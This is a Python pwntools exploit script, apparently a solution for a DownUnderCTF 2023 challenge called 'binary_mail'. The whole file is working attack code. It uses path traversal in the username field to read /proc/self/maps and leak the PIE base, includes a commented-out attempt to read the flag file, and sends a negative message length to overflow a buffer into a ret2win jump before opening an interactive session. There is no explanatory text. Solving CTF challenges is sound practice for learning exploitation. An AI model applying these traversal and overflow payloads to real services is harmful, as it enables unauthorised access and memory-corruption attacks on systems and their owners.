#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2023.ductf.dev --port 30011 ./binary_mail
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./binary_mail')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2023.ductf.dev'
port = int(args.PORT or 30011)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())
tags = ["TAG_RES_MSG", "TAG_RES_ERROR","TAG_INPUT_REQ","TAG_INPUT_ANS","TAG_COMMAND","TAG_STR_PASSWORD","TAG_STR_FROM","TAG_STR_MESSAGE"]

import struct

def tag2i(tag):
    return tags.index(tag)

def pack_taglen(tag,len_):
    return p32(tag2i(tag))+struct.pack("<q",len_)

def unpack_taglen(m):
    tag = tags[u32(m[:4])]
    len_ = u64(m[4:])
    return (tag,len_)

def send_pkt(tag,m,len_=None):
    if len_ is None:
        len_ = len(m)
    io.send(pack_taglen(tag,len_)+m)
    log.info(f'sent: {tag} {len_} {m}')

def recv_pkt():
    tag,len_ = unpack_taglen(io.recv(12))
    m = io.recv(len_)
    log.info(f"recv: {tag} {m}")
    return (tag,m)

def cmd(c,len_=None):
    send_pkt("TAG_COMMAND",c,len_=len_)

def ans(m,len_=None):
    send_pkt("TAG_INPUT_ANS",m,len_=len_)

def recv_pkt_specific(t_e,m_e=None):
    t,m = recv_pkt()
    log.info(f"test tag : {t_e}=={t} ?")
    assert(t==t_e)
    if m_e is not None:
        log.info(f"test m : {m_e}=={m} ?")
        assert(m==m_e)
    return (t,m)

def req(m_e):
    return recv_pkt_specific("TAG_INPUT_REQ",m_e)

def res_ok(m_e):
    return recv_pkt_specific("TAG_RES_MSG",m_e)

def res_err(m_e):
    return recv_pkt_specific("TAG_RES_ERROR",m_e)

def register(user,pw,len_p=None,truncate=False):
    cmd(b"register")
    req(b"username")
    ans(user)
    req(b"password")
    ans(pw,len_=len_p)
    if not truncate:
        res_ok(b"user registered")

def auth(pw,fail=False):
    req(b"password")
    ans(pw)
    if fail:
        return recv_pkt_specific("TAG_RES_ERROR")

def send_mail(user,pw,recp,msg,fail_auth=False):
    cmd(b"send_mail")
    req(b"username")
    ans(user)
    if fail_auth:
        return auth(pw,fail=fail_auth)
    auth(pw)
    req(b"recipient")
    ans(recp)
    req(b"message")
    ans(msg)
    res_ok(b"message sent")

def view_mail(user,pw,fail_auth=False,empty=False):
    cmd(b"view_mail")
    req(b"username")
    ans(user)
    if fail_auth:
        return auth(pw,fail=fail_auth)
    auth(pw)
    _,msg = recv_pkt_specific("TAG_RES_MSG")
    return msg

def get_leak(path):
    leak = view_mail(b".."+path,b"p4ss",fail_auth=True)[1].split(b" ")
    i1 = int(leak[-2])
    i2 = int(leak[-1])
    return pack(i1,'all')+pack(i2,'all')

def printx(**kwargs):
    for k,v in kwargs.items():
        log.info(f"{k}: 0x{v:x}")
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
io=start()
io.recvline()

# pie leak
pie_base = int(get_leak(b"/proc/self/maps"),16)
printx(pie=pie_base)
exe.address = pie_base

# flag leak? lol
#log.info(get_leak(b"/chal/flag.txt")) 

# BOF -> ret2win
pw = b"pass"
user = b"../proc/self/fd/0"
user2 = b"skuuk"
log.info(hex(exe.sym.win))
rop = pack_taglen("TAG_STR_FROM",len(user2))+user2
rop += pack_taglen("TAG_STR_MESSAGE",-1) 
rop += b"a"*(2048-861)+p64(exe.sym.win+1)
cmd(b"view_mail")
req(b"username")
ans(user)
req(b"password")
io.send(pack_taglen("TAG_INPUT_ANS",len(pw)) + pw)
io.send(pack_taglen("TAG_STR_PASSWORD",len(pw)) + pw)
io.sendline(rop)
io.interactive()
